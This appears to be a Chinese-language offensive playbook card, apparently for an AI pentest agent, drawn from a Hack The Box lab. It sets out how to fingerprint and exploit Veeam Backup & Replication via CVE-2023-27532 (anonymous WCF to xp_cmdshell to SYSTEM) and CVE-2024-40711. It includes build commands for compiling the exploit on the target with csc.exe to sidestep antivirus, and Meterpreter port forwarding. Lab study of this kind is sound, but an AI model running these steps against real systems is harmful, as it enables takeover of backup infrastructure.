---
name: 'veeam-backup-attacks'
description: 'nmap 出 9401/9380/9392/6160/6161/6162/6190/6210/11731，或 impacket-rpcdump 里出现 "Veeam Deployer"/"Veeam Invoker"/"Veeam HV Integration" 三个 UUID，或界面上有 Veeam Backup & Replication / 备份服务器时加载：先判"这台是备份服务器还是被管端"，再按版本选 CVE-2023-27532 或 CVE-2024-40711；含 v10 与 v11 接口差异导致的 4 个 PoC 移植坑、以及"端口从外面 filtered ≠ 不存在、有立足点后本机直打"这条实测纪律。(检索词：veeam/veeam-backup/backup/backup server/backup-server/Veeam Backup & Replication/VBR/VeeamHax/9401/9380/9392/6160/6161/6162/6170/6190/6210/11731/10001/10005/10006/cve-2023-27532/27532/cve-2024-40711/40711/VeeamDeploySvc/DeploymentSvc/vPower NFS/rpcdump/net.tcp/portfwd/filtered/备份服务器/备份/备份仓库/被管端/端口过滤)'
whenToUse: '扫描或 rpcdump 在目标上认出 Veeam 组件（Veeam 专有 RPC UUID / 9401 / 6160 / 11731 等端口族），需要判断能不能打、打哪个洞时'
metadata: { domain: ad-win, tier: T2 }
---

# Veeam Backup & Replication 攻击面

> ⚠️ **一手实测卡**（HTB JobTwo, Veeam B&R **10.0.1.4854** + MSSQL$VEEAMSQL2016, 2026-09-30），**非 WP 语料回灌**；
> 版本区间/端口归属部分来自 Veeam 官方 KB/helpcenter 与 NVD（见文末来源）。标 🔷 的是未复现的推论。

## 触发信号

```text
9401/tcp   filtered | open    ← Veeam Backup Service（免认证 RCE 的落点）
9380/tcp                        ← Veeam Distribution Service（CVE-2022-26500/26501）
9392/tcp                        ← Veeam Backup Service / 控制台
6160 / 6161 / 6162 / 6190 / 6210 / 6290 / 11731  ← 被管端/部署组件端口族
10001 / 10002 / 10003 / 10005 / 10006            ← Agent / Plug-In / Cloud Connect 通道
```

🔴 **`impacket-rpcdump` 是最快的产品指纹**（nmap 的 `-sV` 在这几个端口上只会给出 IANA 历史名，全是误导）：

```text
D107C6E0-FC35-49BA-BA03-3E192DE6797D  v1.0  Veeam Deployer            → VeeamDeploySvc.exe
D1C2C07A-D989-48CC-A423-B73ECD518D40  v1.0  Veeam Invoker             → 共享 RpcInvoker（会绑很多端口）
844D6366-6A97-4EB5-8345-B88E8276C20D  v1.0  Veeam HV Integration      → HvIntegrationSvc
```
```bash
impacket-rpcdump TARGET | grep -B2 -A8 -i veeam
```

⚠️ **别被 IANA 服务名带偏**：6160=ecmp、6161=patrol-ism、6162=patrol-coll、10001=scp-config、
10002=documentum、10006=netapp-sync、1063=kyoceranetdev —— 在这台机器上一个都不适用。

## 前置验证

```bash
# 1) 这台是"备份服务器"还是"被管端"？（决定值不值得打）
#    9401 开着且 rpcdump 有 Veeam Deployer  ⇒ 很可能是备份服务器本身（免认证洞的宿主）
#    只有 6160/11731 + 6162/6190/6210        ⇒ 多半是被管端/组件机，Veeam 只是"能力信号"
impacket-rpcdump TARGET | grep -iE 'veeam|9401'

# 2) 🔴 复核 filtered 端口 —— 从外面 filtered 不代表不存在
nmap -Pn -sT -p 9401,9380,9392,6160,6170,6175,6183 TARGET
# 3) 拿到任意立足点后，必须回到靶机内部重扫一遍（见模式 3）
```

## 模式 1: CVE-2023-27532 → 免认证 SQL → xp_cmdshell → SYSTEM（✅ 实测）

**成立条件**：`Veeam.Backup.Service` 监听 9401，且版本 **< 11.0.1.1261**（12.0.0.1420 亦受影响）。

```text
net.tcp://<target>:9401/   SecurityMode=Transport, TcpClientCredentialType=None（匿名）
contract: Veeam.Backup.Interaction.MountService.IRemoteInvokeService
  Invoke(ERemoteInvokeScope, ERemoteInvokeMethod, string)
  GetDataTable(...)   GetDataSet(...)
```
- 凭据泄露：`Invoke(ERemoteInvokeScope.DatabaseManager, ERemoteInvokeMethod.CredentialsDbScopeGetAllCreds, …)`
- 🔴 **RCE**：`GetDataTable(ERemoteInvokeScope.DatabaseAccessor, ERemoteInvokeMethod.GetDataTable, <XML SqlCommand>)`
  —— 这条**用的就是 Veeam 服务自身的 DB 连接**，而 `MSSQL$VEEAMSQL2016` 跑在 **LocalSystem** ⇒
  `sp_configure 'xp_cmdshell'` 之后就是 SYSTEM。

### 🔴 v10 ≠ v11：移植上游 PoC 的 4 个坑（照抄会编译/运行失败）

| # | 坑 | 事实 |
|---|---|---|
| 1 | **凭据泄露路径 v10 没有** | 上游用 `ERemoteInvokeScope.DatabaseManager`；v10 的枚举里**没有这一项**（csc 报 CS0117）。v10 只有 `DatabaseAccessor` ⇒ **RCE 可用、凭据泄露不可用** |
| 2 | `GetDataTable` 返回 **`System.Data.DataTable`**，不是 `string` | 上游把返回值丢弃所以没暴露；要读输出必须自己遍历 `dt.Rows` |
| 3 | 🔴 **服务端不做 XML 反转义** | 写 `&amp;`/`&gt;` 会**原样**传给 cmd ⇒ `&` 被当命令分隔符、后面跟着 `amp;`（实测 `'amp' is not recognized`）。**payload 里不要出现 `& > <`**，一条命令一次调用 |
| 4 | 编译依赖 | 必须 `/r:System.IdentityModel.dll`；csc 是 **C# 5**（`Framework64\v4.0.30319`）⇒ 不能用 raw string literal / file-scoped namespace |

客户端要点（照抄）：`NetTcpBinding` + `SecurityMode.Transport` + `TcpClientCredentialType.None` +
`EndpointIdentity.CreateDnsIdentity("Veeam Backup Server Certificate")` + `CertificateValidationMode.None`。

### 🔴 在靶机上现编译（免上传 exe、免隧道）

```bat
set VB=C:\Program Files\Veeam\Backup and Replication\Backup
mkdir C:\Windows\Temp\vh & cd /d C:\Windows\Temp\vh
copy /Y "%VB%\Veeam.Backup.Common.dll" . & copy /Y "%VB%\Veeam.Backup.Model.dll" .
copy /Y "%VB%\Veeam.Backup.Core.dll" . & copy /Y "%VB%\Veeam.Backup.Interaction.MountService.dll" .
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /platform:x64 /target:exe /out:VeeamHax.exe ^
  /r:Veeam.Backup.Common.dll /r:Veeam.Backup.Model.dll /r:Veeam.Backup.Core.dll ^
  /r:Veeam.Backup.Interaction.MountService.dll ^
  /r:System.dll /r:System.Core.dll /r:System.Security.dll /r:System.ServiceModel.dll ^
  /r:System.Runtime.Serialization.dll /r:System.Xml.dll /r:System.Data.dll /r:System.IdentityModel.dll ^
  Program.cs

:: 提权执行（--sql 打任意 SQL，--enums 打印枚举全量成员用来确认名字）
VeeamHax.exe --target 127.0.0.1 --cmd "whoami"        :: → nt authority\system
```
> 🆕 **通用手段**：Windows 自带 in-box `csc.exe` + 可写的 `C:\Windows\Temp` = **在靶机上现场编译 .NET 工具**，
> 不需要上传 exe（也就绕开了 exe 落地的 AV 面）。Veeam DLL 在 `...\Backup and Replication\Backup\`（**不是 x86 那棵**）。

### HTB 案例
| 机器 | 细节 |
|------|------|
| JobTwo | VBR 10.0.1.4854 → `DatabaseAccessor`+`GetDataTable` → `xp_cmdshell` → `nt authority\system`，两个 flag 一次取完 |

## 模式 2: CVE-2024-40711（12.x 专用，**v10 不适用**）

- 影响：`>= 12.0.0.1420` 且 `< 12.2.0.334`；**12.1.1.56 及更早 = 免认证 RCE**，12.1.2.172 需要认证
- 机制：`.NET Remoting` 里 `BinaryFormatter` 白名单缺 `System.Runtime.Remoting.ObjRef`；
  `CDbCryptoKeyInfo` 作桥接 gadget → 嵌套 ObjRef → RCE（**SYSTEM**）
- 同样落在 **TCP 9401**，PoC：`watchtowrlabs/CVE-2024-40711`（回调腿用 ExploitRemotingService）
- 判据：`12.2.0.334` 已修；`CConnectionInterceptor.IsConnectingIdentityAuthorized` 在 ≤12.1.0.2131 直接返回 true（匿名放行）

## 模式 3: 🔴🔴 filtered ≠ 不存在 —— 有立足点后必须在靶机内重扫

**这是本卡最重要的一条纪律，也是 JobTwo 唯一正解。**

本次前两轮会话都因为"从 Kali `nmap -sT` 看 9401/9380/9392 是 **filtered**"而把 Veeam 判为死路。
实际是：

```cmd
:: 在靶机上（任意低权 shell 即可）
netstat -ano | findstr "9380 9392 9401"
:: → 全部 0.0.0.0 LISTEN，进程是 Veeam.Backup.Service.exe / Veeam.Backup.Agent.ConfigurationService.exe
```

⇒ **host 防火墙只挡外来的；服务本身在本地照常监听。**
⇒ **不需要 `portfwd`**：直接把 PoC 传/编到靶机上、以 `127.0.0.1` 为目标跑（比隧道更稳，也没有 net.tcp 证书的隧道问题）。
若确实要拉出来：Meterpreter `portfwd add -l 9401 -r 127.0.0.1 -p 9401` 再在 Kali 上打。

```bash
# 通用化：每次拿到立足点，都把"外部 filtered"的端口在本机重扫一遍
netstat -ano | findstr LISTENING            # Windows
ss -tlnp                                    # Linux
```

## 模式 4: 端口 / UUID 归属表 —— 哪些是免认证入口，哪些是噪声

| 端口 | 组件 | 免认证可打？ |
|---|---|---|
| **9401** | Veeam Backup Service（WCF net.tcp，`clientCredentialType=None`） | ✅ **CVE-2023-27532 / CVE-2024-40711 的落点** |
| **9380** | Veeam Distribution Service | ✅ CVE-2022-26500/26501（无公开 PoC） |
| 9392 / 9420 | 控制台 ↔ 备份服务器 | 🔷 视版本 |
| 9419 | VBR REST API（响应头 x-api-version / OpenAPI `info.version` 可判版本族） | 版本判定用 |
| 6175 | Threat Hunter Service（CVE-2026-44963，需认证域用户） | ❌ |
| 6160 / 11731 | Veeam Installer Service / Deployer（`VeeamDeploySvc`） | ❌ **在这两个端口上没有公开 CVE/PoC** |
| 6161 | vPower NFS Service | ❌ |
| 6162（+2500-3300） | Veeam Data Mover / Transport | ❌ |
| 6190 / 6290 | Guest Interaction Proxy | ❌ |
| 6210 | off-host proxy（SMB 共享备份的 VSS 快照） | ❌ |
| 10001-10006 | Agent / Plug-In / Cloud Connect 通道 | ❌ |
| 6170 | Mount Service | ❌ |

⇒ **rpcdump 里有 Veeam UUID 只说明"这台属于某个 Veeam 部署"，不等于有洞可打。**
先找 **9401/9380**；找不到就把它当"能力信号"，去查谁是它的管理端。

## 模式 5: 版本判定

| 手段 | 说明 |
|---|---|
| 端口存在性 | **11731 仍开放 ⇒ 版本 ≤ 12.x**（v13 起不再需要该端口） |
| REST API 9419 | `curl -k https://TARGET:9419/api/v1/serverInfo`（🔷 未认证时是否给 build 未验证）；响应头 x-api-version 给版本**族** |
| 构建号表 | Veeam KB2680：11a=11.0.1.1261 / 12 GA=12.0.0.1420 / 12.1.1=12.1.1.56 / 12.2=12.2.0.334 / 13=13.0.0.4967 … |
| 本机文件 | 需要立足点：`Veeam.Backup.Service.exe` 文件版本、日志里 `Release version : X.Y.Z.NNNN` |

## 快速检查清单

```bash
[ ] rpcdump 是否出现 Veeam 三个 UUID？
[ ] 9401 / 9380 状态？—— 外部 filtered 时**必须从靶机内部 netstat 复核**
[ ] 版本落在哪个区间？(<11.0.1.1261 → 27532；12.0.0.1420–12.2.0.334 → 40711)
[ ] 有立足点 ⇒ 直接在靶机上编译并跑 PoC（目标 127.0.0.1），不要纠结隧道
[ ] DLL 从 `Program Files\Veeam\Backup and Replication\Backup\` 取
[ ] payload 里避开 `& > <`；GetDataTable 的返回要自己遍历 DataTable
```

## 教训

1. 🔴 **"端口 filtered" 被当成 "服务不存在" 是本类目标最常见的判断失误**：host 防火墙对内外不对称。
   拿到任意立足点后，**第一件事是把所有 filtered/closed 的端口在本机重扫一遍**。
2. 🔴 **产品专有 RPC 端口族的"有名无洞"特征要有预期**：Veeam 有 6 个端口长期开放却没有任何公开 CVE；
   真正的洞只在 9401/9380。**别在 6160/11731 上耗时间。**
3. 🔴 **同一个 CVE 在不同大版本上的接口不同**，上游 PoC 只对作者那个版本负责；移植前先用 `--enums` 把枚举成员打出来核对名字。
4. 🆕 **in-box `csc.exe` 是被低估的落地手段**：免上传 exe、免打包、免隧道。

## 相关卡

- `windows-privesc` —— 本地提权通用面；本卡是"装了备份/RMM 产品"时的专项补充
- `supply-chain-artifact-attacks` —— 目标不是 Veeam 而是制品仓库/CI 时的相邻面
- `service-attacks` —— 端口不在本卡表里时的通用服务枚举
- `unknown-service-probe` —— 认不出这些端口属于谁时的三步探测法
- `tunneling-port-forwarding` —— 确实需要把 9401 拉出来时的隧道做法
- `mssql-attack-chain` —— 拿到 SQL 执行面之后的通用 MSSQL 手法

## 来源

Veeam `used_ports` / `plan_and_manage_used_ports` / KB2680 / KB4424 / KB4557 · NVD CVE-2023-27532 / CVE-2024-40711 ·
Rapid7 & watchTowr 分析 · sfewer-r7 `CVE-2023-27532`、horizon3ai `CVE-2023-27532`、watchtowrlabs `CVE-2024-40711`。
CVE 区间与 PoC 用法均为**文档口径**；本机实测部分见"模式 1"。
